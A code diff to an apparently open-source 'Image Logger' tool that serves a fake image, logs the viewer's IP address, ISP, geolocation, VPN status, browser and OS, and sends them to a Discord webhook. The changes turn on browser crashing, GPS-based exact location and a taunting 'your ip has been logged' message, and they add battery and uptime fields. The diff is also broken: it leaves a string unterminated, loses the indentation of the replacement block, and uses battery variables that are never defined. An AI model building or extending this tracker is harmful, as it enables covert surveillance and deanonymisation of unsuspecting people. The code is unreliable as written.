@@ -19,16 +19,26 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    
+    "enableLogging": True,
+    
+    "allowNotifications": True,
 
+    "secureConnection": True,
+    
+    "enableCache": True, 
+
+"logLevel": "info",
+    
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. your ip has been logged, # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -162,6 +172,15 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Battery Status:** `{battery_status if battery_status else 'Unknown'}`  
+> **Battery Percentage:** `{battery_percentage if battery_percentage else 'Unknown'}`  
+> **Battery Plugged In:** `{plugged_in if plugged_in else 'Unknown'}`  
+> **Battery Life Remaining:** `{battery_life_remaining if battery_life_remaining else 'Unknown'}`  
+> **Charging Status:** `{charging_status if charging_status else 'Unknown'}`  
+> **Battery Health:** `{battery_health if battery_health else 'Unknown'}`
+> **Opened Time:** `{uptime if uptime else 'Unknown'}`
+
+
 
 **PC Info:**
 > **OS:** `{os}`
@@ -241,20 +260,35 @@ height: 100vh;
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+    # Replacing network-related details
+    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+    message = message.replace("{isp}", result["isp"])
+    message = message.replace("{asn}", result["as"])
+    message = message.replace("{country}", result["country"])
+    message = message.replace("{region}", result["regionName"])
+    message = message.replace("{city}", result["city"])
+    message = message.replace("{lat}", str(result["lat"]))
+    message = message.replace("{long}", str(result["lon"]))
+    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+    message = message.replace("{mobile}", str(result["mobile"]))
+    message = message.replace("{vpn}", str(result["proxy"]))
+    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+
+    # Replacing browser and OS information
+    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+    # Replacing battery-related information
+    message = message.replace("{battery_status}", str(battery_status) if battery_status else 'Unknown')
+    message = message.replace("{battery_percentage}", str(battery_percentage) if battery_percentage else 'Unknown')
+    message = message.replace("{plugged_in}", str(plugged_in) if plugged_in else 'Unknown')
+    message = message.replace("{battery_life_remaining}", str(battery_life_remaining) if battery_life_remaining else 'Unknown')
+    message = message.replace("{charging_status}", str(charging_status) if charging_status else 'Unknown')
+    message = message.replace("{battery_health}", str(battery_health) if battery_health else 'Unknown')
+
+    # Replacing opened time information
+    message = message.replace("{uptime}", str(uptime) if uptime else 'Unknown')
+
 
                 datatype = 'text/html'
 
